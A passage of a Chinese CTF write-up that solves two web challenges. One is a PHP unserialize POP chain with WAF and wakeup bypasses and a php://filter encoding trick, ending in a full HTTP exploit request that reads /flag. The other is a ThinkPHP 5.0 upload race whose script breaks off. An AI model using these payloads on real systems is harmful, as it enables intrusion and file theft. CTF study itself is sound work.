</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>h1</span><span class=o>-&gt;</span><span class=na>nonono</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>h2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>show</span><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span><span class=nv>$args</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/ctf/i&#39;</span><span class=p>,</span><span class=nv>$args</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>][</span><span class=mi>2</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;gogogo&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Chu0_write</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$chu0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$chu1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>chu0</span> <span class=o>=</span> <span class=s1>&#39;xiuxiuxiu&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;__toString&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]);</span>
</span></span></code></pre></td></tr></table></div></div><p><code>$args[0][0][2]</code> 的解释</p><ul><li><code>$args</code>：这是一个数组，包含了所有传递给未定义方法的参数。</li><li><code>$args[0]</code>：这表示 <code>$args</code> 数组的第一个元素（即索引为 <code>0</code> 的元素）。假设您在调用方法时传递了一个数组作为第一个参数，<code>$args[0]</code> 将会是这个参数。</li><li><code>$args[0][0]</code>：这表示 <code>$args[0]</code> 数组的第一个元素（索引为 <code>0</code>）。这意味着 <code>$args[0]</code> 本身也是一个数组，并且我们正在访问它的第一个元素。</li><li><code>$args[0][0][2]</code>：这表示 <code>$args[0][0]</code> 数组的第三个元素（索引为 <code>2</code>）。同样，这意味着 <code>$args[0][0]</code> 也必须是一个数组，并且我们正在访问它的第三个元素。</li></ul><p>然后就可以触发<code>__toString()</code>了，原来正则也可以触发</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctf</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$h1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$h2</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>show</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Chu0_write</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>ctf</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=k>new</span> <span class=nx>Chu0_write</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$b</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>h1</span><span class=o>=</span><span class=k>new</span> <span class=nx>show</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>h2</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/ctfshow-new-year-water-friends-match/QQ20250124-145407.jpg width=1993 height=1359 srcset="/p/ctfshow-new-year-water-friends-match/QQ20250124-145407_hu_f07abc8118d98d8a.jpg 480w, /p/ctfshow-new-year-water-friends-match/QQ20250124-145407_hu_81fed9591d1a9266.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=146 data-flex-basis=351px></p><p>同时传<code>POST</code>和<code>GET</code>其实只会判断<code>POST</code>，可以绕过waf1，将<code>show[show.show</code>进行编码绕过waf2，C打头绕过wakeup</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>ctf</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=k>new</span> <span class=nx>Chu0_write</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$b</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>h1</span><span class=o>=</span><span class=k>new</span> <span class=nx>show</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>h2</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$d</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=s2>&#34;evil&#34;</span><span class=o>=&gt;</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$f</span><span class=o>=</span><span class=k>new</span> <span class=nx>ArrayObject</span><span class=p>(</span><span class=nv>$d</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>/*</span><span class=nx>C</span><span class=o>:</span><span class=mi>11</span><span class=o>:</span><span class=s2>&#34;ArrayObject&#34;</span><span class=o>:</span><span class=mi>143</span><span class=o>:</span><span class=p>{</span><span class=nx>x</span><span class=o>:</span><span class=nx>i</span><span class=o>:</span><span class=mi>0</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;evil&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;ctf&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;h1&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;show&#34;</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=p>{}</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;h2&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>i</span><span class=o>:</span><span class=mi>0</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=p>{</span><span class=nx>i</span><span class=o>:</span><span class=mi>0</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=s2>&#34;&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>1</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=s2>&#34;&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>2</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;Chu0_write&#34;</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=p>{}}}}};</span><span class=nx>m</span><span class=o>:</span><span class=nx>a</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=p>{}}}</span>
</span></span></code></pre></td></tr></table></div></div><p>没看懂这个poc，有会的师傅可以评论区讲讲，反正我运行出来的不行，他不能正常的反序列化，引用地址绕过强比较，<code>cmd</code>的正则用<code>chr(ascii)</code>即可绕过，我们还要往<code>ctfw.txt</code>里面去写可利用的函数而且name要出现base64一次并且只能是一次，且有脏字符需要绕过，这里限制成了只有一次编码，所以不能多次编码绕过，利用编码器进行绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=s2>&#34;baozongwi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$payload</span><span class=o>=</span><span class=nx>iconv</span><span class=p>(</span><span class=s1>&#39;utf8&#39;</span><span class=p>,</span><span class=s1>&#39;utf-16&#39;</span><span class=p>,</span><span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$b</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>quoted_printable_encode</span><span class=p>(</span><span class=nv>$payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>将对应字符进行转换</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span><span class=s1>&#39;assert&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$payload</span> <span class=o>=</span> <span class=nx>iconv</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=s1>&#39;utf-16&#39;</span><span class=p>,</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$b</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>file_put_contents</span><span class=p>(</span><span class=s1>&#39;payload.txt&#39;</span><span class=p>,</span> <span class=nx>quoted_printable_encode</span><span class=p>(</span><span class=nv>$payload</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nv>$s</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;payload.txt&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$s</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/=\r\n/&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$s</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$s</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/?%73%68%6f%77%5b%73%68%6f%77%2e%73%68%6f%77=%43%3a%31%31%3a%22%41%72%72%61%79%4f%62%6a%65%63%74%22%3a%31%39%38%3a%7b%78%3a%69%3a%30%3b%61%3a%31%3a%7b%73%3a%34%3a%22%65%76%69%6c%22%3b%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%33%3a%7b%69%3a%30%3b%73%3a%30%3a%22%22%3b%69%3a%31%3b%73%3a%30%3a%22%22%3b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%73%3a%39%3a%22%78%69%75%78%69%75%78%69%75%22%3b%73%3a%34%3a%22%63%68%75%31%22%3b%52%3a%31%31%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d%3b%6d%3a%61%3a%30%3a%7b%7d%7d&amp;name=php://filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw&amp;chu0=Y=00X=00N=00z=00Z=00X=00J=000=00&amp;cmd=%73%68%6f%77_source(chr(47).chr(102).chr(108).chr(97).chr(103));</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>94882916-b6d5-4288-b1d7-b693fc77c829.challenge.ctf.show</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>38</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua</span><span class=o>:</span> <span class=l>&#34;Not A(Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;132&#34;, &#34;Google Chrome&#34;;v=&#34;132&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Mobile</span><span class=o>:</span> <span class=l>?0</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>https://94882916-b6d5-4288-b1d7-b693fc77c829.challenge.ctf.show</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>same-origin</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>https://94882916-b6d5-4288-b1d7-b693fc77c829.challenge.ctf.show/</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Priority</span><span class=o>:</span> <span class=l>u=0, i</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>show%5Bshow.show=1&amp;name=1&amp;chu0=1&amp;cmd=1
</span></span></code></pre></td></tr></table></div></div><p>好复杂的一道题，像musc一样的总结题吧</p><h2 id=孤注一掷>孤注一掷</h2><p>0DAY，进来是个二维码，扫描拿到源码进行审计，tp5.0，先把源码搞到，然后把applicantion进行替换之后，开始，首先看控制器，里面有个upload.php，多次打比赛的直觉告诉我move出了问题，因为一般move之后都是可以条件竞争的，或者是破坏move的过程，把webshell留下</p><p><img src=/p/ctfshow-new-year-water-friends-match/QQ20250124-193355.jpg width=2112 height=1218 srcset="/p/ctfshow-new-year-water-friends-match/QQ20250124-193355_hu_aa9557f761e10234.jpg 480w, /p/ctfshow-new-year-water-friends-match/QQ20250124-193355_hu_3239fac9bcc7540d.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=173 data-flex-basis=416px></p><p><img src=/p/ctfshow-new-year-water-friends-match/QQ20250124-193518.jpg width=2069 height=1380 srcset="/p/ctfshow-new-year-water-friends-match/QQ20250124-193518_hu_4bc158e54b30ec54.jpg 480w, /p/ctfshow-new-year-water-friends-match/QQ20250124-193518_hu_21f1b1dedced1db.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=149 data-flex-basis=359px></p><p>跟进一下check看看，然后继续跟进<code>checkImage</code></p><p><img src=/p/ctfshow-new-year-water-friends-match/QQ20250124-193703.jpg width=1986 height=1302 srcset="/p/ctfshow-new-year-water-friends-match/QQ20250124-193703_hu_296f132da0b64e47.jpg 480w, /p/ctfshow-new-year-water-friends-match/QQ20250124-193703_hu_6e4336578e19638.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=152 data-flex-basis=366px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>checkImg</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$extension</span> <span class=o>=</span> <span class=nx>strtolower</span><span class=p>(</span><span class=nx>pathinfo</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>getInfo</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>),</span> <span class=nx>PATHINFO_EXTENSION</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=cm>/* 对图像文件进行严格检测 */</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$extension</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;gif&#39;</span><span class=p>,</span> <span class=s1>&#39;jpg&#39;</span><span class=p>,</span> <span class=s1>&#39;jpeg&#39;</span><span class=p>,</span> <span class=s1>&#39;bmp&#39;</span><span class=p>,</span> <span class=s1>&#39;png&#39;</span><span class=p>,</span> <span class=s1>&#39;swf&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>getImageType</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>),</span> <span class=p>[</span><span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>6</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>然后你就发现这就是shi，他反正都返回true的，也就是说任意上传文件，那我们看怎么保存文件的，竞争出来即可，跟进<code>buildSavename</code></p><p><img src=/p/ctfshow-new-year-water-friends-match/QQ20250124-194129.jpg width=1785 height=1127 srcset="/p/ctfshow-new-year-water-friends-match/QQ20250124-194129_hu_ddb645d3b343004b.jpg 480w, /p/ctfshow-new-year-water-friends-match/QQ20250124-194129_hu_7f991f261ae9d8ba.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=158 data-flex-basis=380px></p><p><img src=/p/ctfshow-new-year-water-friends-match/QQ20250124-194424.jpg width=1533 height=1048 srcset="/p/ctfshow-new-year-water-friends-match/QQ20250124-194424_hu_4e9924eb8bae89e3.jpg 480w, /p/ctfshow-new-year-water-friends-match/QQ20250124-194424_hu_3fe86c7413567e3d.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=146 data-flex-basis=351px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$md5</span>      <span class=o>=</span> <span class=nx>md5_file</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$savename</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$md5</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span> <span class=o>.</span> <span class=nx>DS</span> <span class=o>.</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$md5</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>所以撞就完事了，由于目录不是固定的，所以没用正则来进行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>datetime</span> <span class=kn>import</span> <span class=n>datetime</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pytz</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=c1># Author:ctfshow-h1xa</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span><span class=s2>&#34;http://33c133ae-9f99-4711-afbc-d5e7a3b7ef3e.challenge.ctf.show/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>scriptDate</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>prefix</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
